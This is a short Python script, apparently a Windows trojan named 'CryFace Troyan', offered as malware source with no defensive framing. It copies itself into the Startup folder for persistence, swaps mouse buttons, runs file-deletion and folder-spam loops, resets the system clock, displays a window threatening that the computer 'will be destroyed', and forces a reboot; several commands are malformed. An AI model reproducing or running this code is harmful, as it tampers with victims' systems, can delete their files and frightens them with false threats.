import os
import socket
import tkinter as tk
os.system(f"copy CryFaceTroyan.exe \"%userprofile%/STARTM~1/Programs/Startup")
os.system(f"Rundll32, user32, SwapMouseButton")
os.system(f"cd C:/Users/%userprofile%/Desktop")
for deleting in range(100):
	os.system(f"del %random%")
for create in range(100):
	os.system(f"md Troyan{create}")
os.system(f"set date=1")
os.system(f"time 0:00")
def close():
	root.destroy()
root = tk.Tk()
lab1 = tk.Label(master=root, text="You Computer Fucked by CryFace Troyan!")
lab2 = tk.Label(master=root, text="If you close this Program your computer")
lab3 = tk.Label(master=root, text="will be destroyed!")
labx = tk.Label(master=root, text="If you close the files your computer")
labc = tk.Label(master=root, text="will be destroyed!")
lab4 = tk.Label(master=root, text="And If you Shutdown your Computer it")
lab5 = tk.Label(master=root, text="will to destroyed ...\n")
but1 = tk.Button(master=root, text="Close", command=close)
lab1.pack()
lab2.pack()
lab3.pack()
labx.pack()
labc.pack()
lab4.pack()
lab5.pack()
root.mainloop()
os.system(f"shutdown -r -t 5 -c \"You Pc Fucked by CryFace Troyan!\"")